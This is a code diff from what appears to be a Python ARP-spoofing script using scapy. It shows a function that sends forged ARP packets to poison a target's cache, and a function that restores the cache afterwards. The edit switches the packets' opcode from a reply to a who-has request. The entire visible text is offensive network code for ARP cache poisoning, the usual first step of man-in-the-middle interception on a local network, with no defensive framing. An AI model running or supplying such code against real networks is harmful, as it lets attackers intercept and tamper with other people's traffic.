@@ -4,11 +4,11 @@ from scapy.sendrecv import sr
 result = []
 
 def spoofarpcache(targetip, targetmac, sourceip):
-    spoofed= ARP(op=2 , pdst=targetip, psrc=sourceip, hwdst= targetmac)
+    spoofed= ARP(op=ARP.who_has , pdst=targetip, psrc=sourceip, hwdst= targetmac)
     result.append(sr(spoofed, verbose= False))
 
 def restorearp(targetip, targetmac, sourceip, sourcemac):
-    packet= ARP(op=2 , hwsrc=sourcemac , psrc= sourceip, hwdst= targetmac , pdst= targetip)
+    packet= ARP(op=ARP.who_has , hwsrc=sourcemac , psrc= sourceip, hwdst= targetmac , pdst= targetip)
     result.append(sr(packet, verbose=False))
     print("ARP Table restored to normal for", targetip)
 
